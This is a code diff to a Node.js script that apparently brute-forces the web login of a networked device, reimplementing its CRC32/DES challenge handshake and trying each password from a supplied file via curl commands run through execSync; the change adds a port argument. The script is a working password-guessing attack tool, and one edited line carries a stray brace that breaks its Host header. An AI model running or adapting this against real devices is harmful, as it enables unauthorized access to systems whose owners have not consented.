@@ -33,7 +33,7 @@ function LoginHandler(oTracer, resp) {
       var iPasswordToken = (MakeCRC32(String2UTF8(sPasswordToken)) ^ m_iKey2) >>> 0;
       var iServerChallengeToken = (oTracer.m_iKey1A1 ^ oTracer.m_iKey1A2 ^ oTracer.m_iKey1B1 ^ oTracer.m_iKey1B2 ^ m_iKey2) >>> 0;
       var Str_ = "UAMLOGIN:Web User" + "," + iPasswordToken + "," + iServerChallengeToken;
-      var command = `curl -s -k -X POST -H "Host: ${HOST}" -H "User-Agent: ${USERAGENT}" -H "Accept: */*" -H $"Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: http://${HOST}/logo_login.shtm?!App-Language=1" -H "App-Language: 1" -H "Security-Hint: ${m_sRef}" -H "Content-Type: text/plain;charset=UTF-8" -H "Connection: close" --data-binary "${Str_}" "http://${HOST}/AJAX"`
+      var command = `curl -s -k -X POST -H "Host: ${HOST}:${PORT}" -H "User-Agent: ${USERAGENT}" -H "Accept: */*" -H $"Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: http://${HOST}:${PORT}/logo_login.shtm?!App-Language=1" -H "App-Language: 1" -H "Security-Hint: ${m_sRef}" -H "Content-Type: text/plain;charset=UTF-8" -H "Connection: close" --data-binary "${Str_}" "http://${HOST}:${PORT}/AJAX"`
       var out2 = child_process.execSync(command, function(error, stdout, stderr){
       if(error !== null){console.log('exec error: ' + error);}
       });
@@ -52,7 +52,7 @@ function Login(oTracer) {
     oTracer.m_oPrivateKey1A = DESMakeKey(oTracer.m_iKey1A1, oTracer.m_iKey1A2);
     oTracer.m_oPrivateKey1B = DESMakeKey(oTracer.m_iKey1B1, oTracer.m_iKey1B2);
     var Str_ = "UAMCHAL:" + "3,4," + oTracer.m_iKey1A1 + "," + oTracer.m_iKey1A2 + "," + oTracer.m_iKey1B1 + "," + oTracer.m_iKey1B2;
-    var command = `curl -s -k -X POST -H "Host: ${HOST}" -H "User-Agent: ${USERAGENT}" -H "Accept: */*" -H $"Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: http://${HOST}/logo_login.shtm?!App-Language=1" -H "App-Language: 1" -H "Security-Hint: p" -H "Content-Type: text/plain;charset=UTF-8" -H "Connection: close" --data-binary "${Str_}" "http://${HOST}/AJAX"`
+    var command = `curl -s -k -X POST -H "Host: ${HOST}}:${PORT}" -H "User-Agent: ${USERAGENT}" -H "Accept: */*" -H $"Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: http://${HOST}:${PORT}/logo_login.shtm?!App-Language=1" -H "App-Language: 1" -H "Security-Hint: p" -H "Content-Type: text/plain;charset=UTF-8" -H "Connection: close" --data-binary "${Str_}" "http://${HOST}:${PORT}/AJAX"`
     var out1 = child_process.execSync(command, function(error, stdout, stderr){
     if(error !== null){console.log('exec error: ' + error);}
     });
@@ -169,7 +169,8 @@ function GetCredsFile(path){
 
 StartPrint();
 var HOST = process.argv[2];
-var passwords = GetCredsFile(process.argv[3]);
+var PORT = process.argv[3]
+var passwords = GetCredsFile(process.argv[4]);
 var passwordsLength = passwords.length;
 for (var i = 0; i < passwordsLength-1; i++) {
   space_len = new Array(Math.max(0, 9 - passwords[i].length) + 13 - Math.max(0,passwords[i].length - 9)).join(' ');
